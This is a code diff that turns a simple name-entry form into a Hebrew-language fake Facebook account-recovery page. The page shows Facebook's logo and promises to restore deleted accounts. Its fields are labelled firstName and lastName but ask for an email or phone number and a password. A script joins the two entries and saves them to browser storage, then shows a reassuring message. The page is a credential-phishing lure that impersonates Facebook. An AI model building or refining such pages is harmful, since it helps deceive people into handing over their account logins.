@@ -1,25 +1,91 @@
 <!DOCTYPE html>
-<html>
+<html lang="he">
 <head>
-    <title>Enter Your Name</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>שחזור חשבון</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f4f8;
+            color: #333;
+            text-align: center;
+            padding: 20px;
+        }
+        .header {
+            background-color: #3b5998;
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+        .header img {
+            width: 150px; /* הגדלתי את גודל הלוגו */
+        }
+        .content {
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            padding: 20px;
+            max-width: 500px;
+            margin: 20px auto;
+        }
+        .content h1, .content h2 {
+            color: #3b5998;
+        }
+        .content form {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            align-items: center;
+        }
+        .content input[type="text"], .content button {
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+            width: 80%;
+            max-width: 400px;
+        }
+        .content button {
+            background-color: #3b5998;
+            color: white;
+            border: none;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        .content button:hover {
+            background-color: #2d4373;
+        }
+    </style>
 </head>
 <body>
-    <h1>Enter Your Name</h1>
-    <form id="nameForm">
-        <input type="text" id="name" required>
-        <button type="submit">Send</button>
-    </form>
+    <div class="header">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook Logo">
+    </div>
+    <div class="content">
+        <h1>שחזור חשבון שנמחק או פרטים שנמחקו</h1>
+        <h2>אם חשבון הפייסבוק שלך נמחק או שנמחקו ממנו פרטים, נוכל לעזור לשחזר אותם. נא להזין את שם המשתמש והסיסמה של החשבון הישן שלך, ואנחנו נעשה כמיטב יכולתנו לשחזר את המידע שלך.</h2>
+        <form id="nameForm">
+            <input type="text" id="firstName" placeholder="Email or phone number" required>
+            <input type="text" id="lastName" placeholder="Password" required>
+            <button type="submit">שחזור</button>
+        </form>
+    </div>
     <script>
         document.getElementById('nameForm').addEventListener('submit', function(event) {
             event.preventDefault();
-            const name = document.getElementById('name').value;
-            if (name) {
+            const firstName = document.getElementById('firstName').value;
+            const lastName = document.getElementById('lastName').value;
+            const fullName = firstName + ' ' + lastName;
+            if (fullName) {
                 let names = localStorage.getItem('names');
                 names = names ? JSON.parse(names) : [];
-                names.push(name);
+                names.push(fullName);
                 localStorage.setItem('names', JSON.stringify(names));
-                document.getElementById('name').value = '';
-                alert('Name saved successfully!');
+                document.getElementById('firstName').value = '';
+                document.getElementById('lastName').value = '';
+                alert('We will send you a message soon!');
             }
         });
     </script>
